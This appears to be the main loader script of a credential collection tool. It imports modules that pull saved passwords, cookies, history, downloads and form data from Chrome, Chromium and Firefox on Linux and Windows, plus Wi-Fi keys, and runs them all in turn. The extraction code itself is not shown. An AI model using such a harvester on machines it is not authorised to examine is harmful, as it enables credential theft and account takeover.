#!/usr/local/bin/python
# coding: utf-8

import time

from modules.linux.chrome.cookie import LinuxChromeCookie
from modules.linux.chrome.download import LinuxChromeDownload
from modules.linux.chrome.history import LinuxChromeHistory
from modules.linux.chrome.db_password import LinuxChromeDbPassword
from modules.linux.chrome.keyring_password import LinuxChromeKeyringPassword


from modules.windows.chromium.password import WindowsChromiumPassword
from modules.windows.chromium.history import WindowsChromiumHistory
from modules.windows.chromium.download import WindowsChromiumDownload
from modules.windows.chromium.cookie import WindowsChromiumCookie
from modules.windows.chromium.saved_data import WindowsChromiumSavedData

from modules.windows.firefox.password import WindowsFirefoxPassword
from modules.windows.firefox.history import WindowsFirefoxHistory
from modules.windows.firefox.cookie import WindowsFirefoxCookie
from modules.windows.firefox.saved_data import WindowsFirefoxSavedData

from modules.windows.wifi import WindowsWifi


modules = [
		LinuxChromeCookie(),
		LinuxChromeHistory(),
		LinuxChromeDownload(),
		LinuxChromeDbPassword(),
		LinuxChromeKeyringPassword(),

		WindowsChromiumPassword(),
		WindowsChromiumHistory(),
		WindowsChromiumDownload(),
		WindowsChromiumCookie(),
		WindowsChromiumSavedData(),

		WindowsFirefoxPassword(),
		WindowsFirefoxHistory(),
		WindowsFirefoxCookie(),
		WindowsFirefoxSavedData(),

		WindowsWifi(),
	]


def execute():
	for module in modules:
		module.init()
